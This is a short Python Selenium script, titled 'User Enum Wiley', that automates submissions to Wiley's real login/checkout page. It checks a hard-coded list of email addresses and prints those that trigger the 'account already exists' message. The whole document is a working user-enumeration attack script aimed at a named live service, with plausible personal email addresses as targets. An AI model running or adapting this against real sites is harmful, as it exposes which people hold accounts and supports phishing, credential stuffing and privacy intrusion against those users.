# User Enum Wiley
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from time import sleep
import extract_html_diff

print("The usernames present in Wiley are:")

# Place all the Email IDs to test in the for loop as shown below.
# You can remove all the Email IDs below
for i in ["superman@gmail.com", "priyanka@gmail.com", "djbjasdtman@gmail.com", "michael@gmail.com", "raghavdevgon@yahoo.com"]:
    user = i

    # Using edge browser
    driver = webdriver.Edge(executable_path='msedgedriver')

    # Using Firefox browser
    # driver = webdriver.FirefoxProfile()
    # driver = webdriver.Firefox(driver)

    driver.get("https://www.wiley.com/en-us/login/checkout")
    p1 = driver.page_source
    sleep(3)
    elem=driver.find_element_by_xpath("//input[@type='text']") #type = 'text'/'email'
    elem.send_keys(user)
    elem.send_keys(Keys.RETURN)
    p2 = driver.page_source
    p3 = extract_html_diff.as_string(p2, p1)

    if "! An account already exists for this email address. Please log in." in p3:
        print(i)
    sleep(2)
    driver.close()
